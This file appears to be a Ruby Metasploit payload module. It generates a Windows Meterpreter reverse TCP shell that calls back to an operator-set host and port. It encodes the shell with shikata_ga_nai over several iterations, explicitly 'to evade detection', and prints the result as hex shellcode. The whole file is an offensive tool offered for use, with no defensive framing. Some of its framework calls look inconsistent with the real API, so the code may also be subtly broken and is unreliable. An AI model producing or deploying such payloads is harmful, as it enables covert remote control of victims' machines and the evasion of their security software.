#!/usr/bin/env ruby
# custom_payload_generator.rb
# A Metasploit payload module to generate a reverse TCP shell payload encoded with a chosen encoder.
# Place this file in: modules/payloads/custom_payload_generator.rb

require 'msf/core'
require 'msf/core/payload_generator'

class MetasploitModule < Msf::Payload
  include Msf::Payload::Single
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseTcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Payload Generator',
      'Description'    => %q{
        Generates a Windows Meterpreter reverse TCP shell payload
        encoded with a specified encoder to evade detection.
      },
      'Author'         => ['Ahmed Belhaj', 'Xavier'],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',
      'SessionTypes'   => ['meterpreter']
    ))

    register_options([
      Opt::LHOST(),
      Opt::LPORT(),
      OptString.new('ENCODER', [true, 'Encoder to use', 'x86/shikata_ga_nai']),
      OptInt.new('ENCODER_ITERATIONS', [true, 'Number of encoding iterations', 3])
    ])
  end

  def generate
    # Generate raw payload
    raw = Msf::Util::PayloadGenerator.generate(
      framework, 'windows/meterpreter/reverse_tcp',
      'LHOST' => datastore['LHOST'], 'LPORT' => datastore['LPORT']
    )

    encoder_name = datastore['ENCODER']
    iterations   = datastore['ENCODER_ITERATIONS']
    print_status("[*] Generating payload with encoding: #{encoder_name}")

    # Encode the payload
    encoder = framework.encoders.create(encoder_name)
    encoded = encoder.encode(raw, iterations)

    # Output encoded payload in hex form
    hex = encoded.unpack('H*')[0].scan(/../).map { |b| "\\x#{b}" }.join
    print_good("[+] Generated encoded payload: #{hex}")

    encoded
  end
end